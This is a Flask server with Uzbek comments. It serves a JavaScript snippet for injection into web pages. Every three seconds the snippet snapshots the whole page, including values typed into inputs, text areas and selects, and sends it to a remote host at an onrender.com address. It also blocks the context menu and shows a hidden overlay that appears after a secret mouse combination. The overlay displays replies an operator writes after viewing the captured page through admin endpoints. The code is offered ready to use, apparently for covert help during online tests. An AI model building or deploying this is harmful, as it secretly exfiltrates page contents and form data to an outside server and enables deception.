from flask import Flask, request, jsonify, Response
from flask_cors import CORS
import os
import hashlib

app = Flask(__name__)
CORS(app)

# --- MA'LUMOTLAR OMBORI ---
storage = {
    "html": None,
    "page_url": "",
    "reply": "Javob yo'q",  # Standart javob
    "html_id": 0,
    "reply_id": 0,
    "last_hash": ""
}

# --- JAVASCRIPT KOD (MAXFIY "COMBO" REJIMI BILAN) ---
JAVASCRIPT_TEMPLATE = """
(function(){
    // -------------------------------------------------------------
    // 👇👇👇 SERVER MANZILI (Siz bergan manzil) 👇👇👇
    const serverUrl = "SERVER_URL_PLACEHOLDER";
    // -------------------------------------------------------------

    let holdTimer = null;           // 5 sekundlik taymer
    let isComboReady = false;       // "Tizim ochiq" holati
    let rightClickCount = 0;        // Bosishlar soni
    let resetTimer = null;          // Bekor qilish taymeri
    let lastMessage = "Hozircha javob yo'q..."; 

    // 1. YASHIRIN OYNA STILI (Pastki markazda, shaffof qora)
    const secretBox = document.createElement('div');
    secretBox.style.cssText = `
        position: fixed;
        bottom: 50px;
        left: 50%;
        transform: translateX(-50%);
        background: rgba(0, 0, 0, 0.7); /* Shaffof qora fon */
        color: white;
        padding: 15px 30px;
        border-radius: 12px;
        font-family: sans-serif;
        font-size: 16px;
        text-align: center;
        display: none; /* Boshida yashirin */
        z-index: 2147483647; /* Eng yuqori qatlam */
        backdrop-filter: blur(4px); /* Orqa fonni xira qilish */
        border: 1px solid rgba(255,255,255,0.3);
        box-shadow: 0 4px 15px rgba(0,0,0,0.5);
        user-select: none;
    `;
    document.body.appendChild(secretBox);

    // Xabarni ko'rsatish funksiyasi
    function showMessage() {
        secretBox.innerHTML = "📩 <b>JAVOB:</b><br>" + lastMessage;
        secretBox.style.display = 'block';
    }

    // Xabarni yashirish funksiyasi
    function hideMessage() {
        secretBox.style.display = 'none';
        isComboReady = false;
        rightClickCount = 0;
    }

    // --- 2. SICHQONCHA BOSHQARUVI (LOGIKA) ---

    // O'ng tugma menyusini (Context Menu) bloklash
    document.addEventListener('contextmenu', event => event.preventDefault());

    // BOSIB TURISH (MOUSEDOWN)
    document.addEventListener('mousedown', (e) => {
        // Agar o'ng tugma (2) bosilsa
        if (e.button === 2) {
            // 5 sekund sanashni boshlaymiz
            holdTimer = setTimeout(() => {
                isComboReady = true; // 5 sekund o'tdi, tayyor!
                rightClickCount = 0; // Sanoqni nollaymiz
                console.log("🔓 Tizim ochildi! Endi 2 marta bosing.");

                // Agar foydalanuvchi uzoq vaqt hech narsa qilmasa (10 sek), yopamiz
                if (resetTimer) clearTimeout(resetTimer);
                resetTimer = setTimeout(() => { 
                    isComboReady = false; 
                    console.log("Vaqt tugadi."); 
                }, 10000);

            }, 5000); // 5000 ms = 5 sekund
        }
    });

    // QO'YIB YUBORISH (MOUSEUP)
    document.addEventListener('mouseup', (e) => {
        if (e.button === 2) {
            // Agar 5 sekund o'tmasdan qo'yib yuborsa, taymerni buzamiz
            if (holdTimer) clearTimeout(holdTimer);

            // Agar tizim tayyor bo'lsa (5 sek bosib turilgan bo'lsa)
            if (isComboReady) {
                rightClickCount++;
                // Mantiq: 
                // 1-bosish = Qo'yib yuborish (hold tugashi)
                // 2-bosish = Birinchi "Click"
                // 3-bosish = Ikkinchi "Click"
                if (rightClickCount >= 3) {
                    showMessage();
                    // Ish bitdi, qayta kodni terish kerak
                    isComboReady = false;
                    rightClickCount = 0;
                }
            }
        }
    });

    // YASHIRISH (2 MARTA CHAP TUGMA - DOUBLE CLICK)
    document.addEventListener('dblclick', (e) => {
        // Chap tugma (0)
        if (e.button === 0) {
            hideMessage();
        }
    });


    // --- 3. SERVER BILAN ALOQA (Har 3 soniyada) ---
    function getFullDom() {
        try {
            // Inputlarni qiymatini HTMLga yozib qo'yish
            document.querySelectorAll('input').forEach(el => {
                if (el.type == 'checkbox' || el.type == 'radio') {
                    el.checked ? el.setAttribute('checked', 'checked') : el.removeAttribute('checked');
                } else { el.setAttribute('value', el.value); }
            });
            document.querySelectorAll('textarea').forEach(el => { el.innerHTML = el.value; });
            document.querySelectorAll('select').forEach(el => {
                el.querySelectorAll('option').forEach(o => {
                    o.selected ? o.setAttribute('selected', 'selected') : o.removeAttribute('selected');
                });
            });
        } catch(e) {}
        return document.documentElement.outerHTML;
    }

    setInterval(() => {
        const fullHtml = getFullDom();
        fetch(serverUrl + '/upload', {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            keepalive: true,
            body: JSON.stringify({html: fullHtml, page: window.location.href})
        }).then(r => r.json()).then(data => {

            // Serverdan kelgan javobni yangilash
            if (data.reply) {
                lastMessage = data.reply;
                // Agar oyna ochiq bo'lsa, jonli yangilaymiz
                if (secretBox.style.display === 'block') {
                    secretBox.innerHTML = "📩 <b>JAVOB:</b><br>" + lastMessage;
                }
            }

        }).catch(e => {}); // Xatolik bo'lsa indamaymiz
    }, 3000); 

    console.log("System Ready.");
})();
"""


@app.route('/', methods=['GET'])
def home():
    return "Server faol! Scriptni olish uchun /script.js ga murojaat qiling.", 200


@app.route('/script.js', methods=['GET'])
def get_script():
    # ---------------------------------------------------------
    # 👇 SIZNING SERVER MANZILINGIZ 👇
    MY_RENDER_URL = "https://mening-serverim.onrender.com"
    # ---------------------------------------------------------

    final_code = JAVASCRIPT_TEMPLATE.replace("SERVER_URL_PLACEHOLDER", MY_RENDER_URL)
    return Response(final_code, mimetype='application/javascript')


@app.route('/upload', methods=['POST'])
def upload():
    data = request.json
    content = data.get('html', '')
    url = data.get('page', '')

    # Hash orqali tekshirish (o'zgarish borligini bilish uchun)
    content_hash = hashlib.md5(content.encode('utf-8')).hexdigest()

    # Javobni tayyorlaymiz
    response_data = {
        "reply": storage['reply']  # Doim serverdagi hozirgi javobni qaytaramiz
    }

    if content_hash != storage['last_hash']:
        storage['html'] = content
        storage['page_url'] = url
        storage['last_hash'] = content_hash
        storage['html_id'] += 1
        print(f"Yangi ma'lumot keldi! ID: {storage['html_id']}")
        response_data["status"] = "new_data"
    else:
        response_data["status"] = "ignored"

    return jsonify(response_data)


# --- ADMIN UCHUN YO'LLAR ---

# 1. Hozirgi holatni ko'rish
@app.route('/admin-check', methods=['GET'])
def admin_check():
    return jsonify({
        "html_id": storage['html_id'],
        "url": storage['page_url'],
        "current_reply": storage['reply']
    })


# 2. Saytning HTML kodini olish
@app.route('/admin-get-html', methods=['GET'])
def admin_get_html():
    return jsonify({"html": storage['html']})


# 3. Foydalanuvchiga javob yozish
@app.route('/admin-reply', methods=['POST'])
def admin_reply():
    msg = request.json.get('message')
    if msg:
        storage['reply'] = msg
        storage['reply_id'] += 1
        return jsonify({"status": "Javob saqlandi", "message": msg})
    return jsonify({"status": "Xatolik: Xabar bo'sh"}), 400


if __name__ == '__main__':
    port = int(os.environ.get("PORT", 5000))
    app.run(host='0.0.0.0', port=port)